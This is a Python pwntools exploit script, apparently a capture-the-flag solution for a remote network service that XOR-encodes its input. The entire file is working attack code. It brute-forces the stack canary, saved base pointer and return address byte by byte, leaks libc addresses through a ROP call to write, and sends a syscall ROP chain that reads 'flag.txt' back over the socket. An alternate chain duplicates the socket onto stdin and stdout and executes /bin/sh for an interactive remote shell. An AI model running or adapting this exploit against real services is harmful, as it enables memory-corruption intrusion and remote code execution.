#!/usr/bin/env python3

from pwn import *

# ~ [*] Leaking libc addresses
# ~ [+] Leaked libc address for setsockopt : 0x7f9b83b13500
# ~ [+] Leaked libc address for write : 0x7f9b83b02280
# ~ [+] Leaked libc address for read : 0x7f9b83b02220

def Main(ip, port):

    canary = MemoryBruteforce(ip, port)
    base_ptr = MemoryBruteforce(ip, port, canary)
    ret_addr = MemoryBruteforce(ip, port, canary, base_ptr) #main+566

    prog_base = ret_addr - 0xecf

    if ip == "localhost" or ip == "127.0.0.1":
        log.warning("Ready to attach, press enter to continue")
        input()

    ### libc version wasn't found in any database; gonna manually syscall instead
    # ~ libc_read = LeakLibc(ip, port, canary, base_ptr, prog_base)

    # ~ DoExploit(ip, port, canary, base_ptr, prog_base), libc_read)

    DoExploitSyscall(ip, port, canary, base_ptr, prog_base)


def DoExploitSyscall(ip, port, canary, base_ptr, prog_base):
    syscall = prog_base + 0xb55
    pop_rax = prog_base + 0xb51
    pop_rdi = prog_base + 0x0f73
    pop_rsi = prog_base + 0x0f71   ### pop rsi; pop r15
    pop_rdx = prog_base + 0xb53


    sys_open = 0x02
    sys_read  = 0x00
    sys_write = 0x01

    sys_dup2 = 0x21
    sys_execve = 0x3b

    conn = DoOverflow(ip, port, canary, base_ptr, prog_base)

    buff = b"A" * 8

    buff += p64(pop_rax)
    buff += p64(sys_open)
    buff += p64(pop_rdi)
    buff += p64(base_ptr + 0x88)  # flag.txt ptr
    buff += p64(pop_rsi)
    buff += p64(0) # O_RDONLY
    buff += p64(0x42069)
    buff += p64(pop_rdx)
    buff += p64(0)
    buff += p64(syscall)

    buff += p64(pop_rax)
    buff += p64(sys_read)
    buff += p64(pop_rdi)
    buff += p64(5)  # fd
    buff += p64(pop_rsi)
    buff += p64(base_ptr + 0x100)  # buff
    buff += p64(0x42069)  #r15
    buff += p64(pop_rdx)
    buff += p64(0x50)  #len
    buff += p64(syscall)

    buff += p64(pop_rax)
    buff += p64(sys_write)
    buff += p64(pop_rdi)
    buff += p64(4)  # fd
    buff += p64(pop_rsi)
    buff += p64(base_ptr + 0x100)  # buff
    buff += p64(0x42069)  #r15
    buff += p64(pop_rdx)
    buff += p64(0x50)  #len
    buff += p64(syscall)
    buff += b"flag.txt"
    buff += p64(0)


    ### couldnt get shell to pop....?
    # ~ buff += p64(pop_rax)
    # ~ buff += p64(sys_dup2)
    # ~ buff += p64(pop_rdi)
    # ~ buff += p64(4)  # sock fd
    # ~ buff += p64(pop_rsi)
    # ~ buff += p64(0)  ## stdin
    # ~ buff += p64(0x42069)  #r15
    # ~ buff += p64(syscall)

    # ~ buff += p64(pop_rax)
    # ~ buff += p64(sys_dup2)
    # ~ buff += p64(pop_rdi)
    # ~ buff += p64(4)  # sock fd
    # ~ buff += p64(pop_rsi)
    # ~ buff += p64(1)  ## stdout
    # ~ buff += p64(0x42069)  #r15
    # ~ buff += p64(syscall)

    # ~ print(hex(base_ptr))
    # ~ buff += p64(pop_rax)
    # ~ buff += p64(sys_execve)
    # ~ buff += p64(pop_rdi)
    # ~ buff += p64(base_ptr + 0x68) # bin_sh ptr
    # ~ buff += p64(pop_rsi)
    # ~ buff += p64(0)
    # ~ buff += p64(0x420)  #r15
    # ~ buff += p64(pop_rdx)
    # ~ buff += p64(0)
    # ~ buff += p64(syscall)
    # ~ buff += b"/bin/sh\x00"

    conn.clean()

    log.info("Sending exploit....")

    conn.write(buff)

    print(conn.read(25))

    conn.close()

def DoExploit(ip, port, canary, base_ptr, prog_base, libc_read):
### worked locally; not remotly bc the libc version cant be found

    read_offset = 0xeede0
    dup2_offset = 0xef6d0
    execve_offset = 0xcb620
    bin_sh_offset = 0x18a156

    dup2 = libc_read - read_offset + dup2_offset
    execve = libc_read - read_offset + execve_offset
    bin_sh = libc_read - read_offset + bin_sh_offset

    pop_rdi = prog_base + 0x0f73
    pop_rsi = prog_base + 0x0f71   ### pop rsi; pop r15
    pop_rdx = prog_base + 0xb53

    conn = DoOverflow(ip, port, canary, base_ptr, prog_base)

    buff = b"A" * 8

    buff += p64(pop_rdi)
    buff += p64(4)  # sock fd
    buff += p64(pop_rsi)
    buff += p64(0)  ## stdin
    buff += p64(0x420)  #r15
    buff += p64(dup2)

    buff += p64(pop_rdi)
    buff += p64(4)  # sock fd
    buff += p64(pop_rsi)
    buff += p64(1)  ## stdout
    buff += p64(0x420)  #r15
    buff += p64(dup2)

    buff += p64(pop_rdi)
    buff += p64(bin_sh)
    buff += p64(pop_rsi)
    buff += p64(0)
    buff += p64(0x420)  #r15
    buff += p64(pop_rdx)
    buff += p64(0)
    buff += p64(execve)

    conn.clean()

    log.info("Sending exploit....")

    conn.write(buff)

    conn.interactive()


def LeakLibc(ip, port, canary, base_ptr, prog_base):
    got = {
        "setsockopt"   : 0x202018,
        "write"             : 0x202020,
        "read"              :  0x202050
    }

    write_plt = prog_base + 0x910

    pop_rdi = prog_base + 0x0f73
    pop_rsi = prog_base + 0x0f71   ### pop rsi; pop r15
    pop_rdx = prog_base + 0xb53

    log.info("Leaking libc addresses")

    for func in got:
        context.log_level = 'WARNING'

        conn = DoOverflow(ip, port, canary, base_ptr, prog_base)

        buff = b"A" *8

        buff += p64(pop_rdi)
        buff += p64(4)  ## sock fd

        buff += p64(pop_rsi)
        buff += p64(  got[func] + prog_base )  #write buff
        buff += p64( 0x69420 )    # pop r15, dont need

        buff += p64(pop_rdx)
        buff += p64(8)  # write len

        buff += p64(write_plt)

        conn.clean()

        conn.write(buff)

        addr = u64( conn.read(8) )

        conn.close()

        context.log_level = 'INFO'

        log.success("Leaked libc address for {} : {}".format(func, hex(addr)))

    return addr


def DoOverflow(ip, port, canary, base_ptr, prog_base):
    conn = remote(ip, int(port))

    conn.readuntil(b"Username:")

    buff_ptr     = base_ptr + 0x3b0 - 16   ## +0x3b0 is rsp; go -16 to reuse 0x04 from overflow for socket fd
    start_read = prog_base + 0xbb2  ## check_username+67

    overflow = b"A" * cyclic_find(0x6b616166)
    overflow += p32(0x4) ## socket fd

    overflow += b"B" * (1032 - len(overflow))

    if len(overflow) != 1032:
        log.critical("Wrong length")
        sys.exit(1)

    overflow += p64(canary)
    overflow += p64(buff_ptr)
    overflow += p64(start_read)

    conn.write( DoXor(overflow) )

    return conn


def MemoryBruteforce(ip, port, canary=None, base_ptr=None):
    memory = list()

    if canary == None:
        log.info("Bruteforcing stack canary")

    elif base_ptr == None:
        log.info("Bruteforcing base pointer")
        canary = p64(canary)

    else:
        log.info("Bruteforcing return address")
        memory = ['\xcf']
        canary = p64(canary)
        base_ptr = p64(base_ptr)

    username = DoXor( b"davide" )

    while len(memory) < 8:
        for guess in list(range(256)):
            if guess % 50 == 0:
                context.log_level = 'INFO'
                log.progress("Searching for byte {}/8 - checked {}%".format(len(memory)+1, round( (guess/256) * 100)))

            context.log_level = 'WARNING'

            conn = remote(ip, int(port))

            overflow = username
            overflow += b'A' * (1032 - len(overflow))

            if canary != None:
                overflow += canary

            if base_ptr != None:
                overflow += base_ptr

            overflow += ''.join(memory).encode('latin-1')
            overflow += chr(guess).encode('latin-1')

            conn.write( DoXor(overflow) )

            try:
                conn.readuntil(b"Username found!")
                memory.append( chr(guess) )
                break

            except EOFError:
                pass

            finally:
                conn.close()

    memory = u64(''.join(memory).encode('latin-1'))

    context.log_level = 'INFO'

    log.success("Found! {}".format( hex( memory )))

    return memory


def DoXor(buff):
    """Takes a byte object"""

    buff2 = list()

    for char in buff:
        ### static xor key from program
        buff2.append( char ^ 0xd )

    return bytes(buff2)


if __name__ == "__main__":
    argv = sys.argv

    if len(argv) > 2:
        Main(argv[1], argv[2])
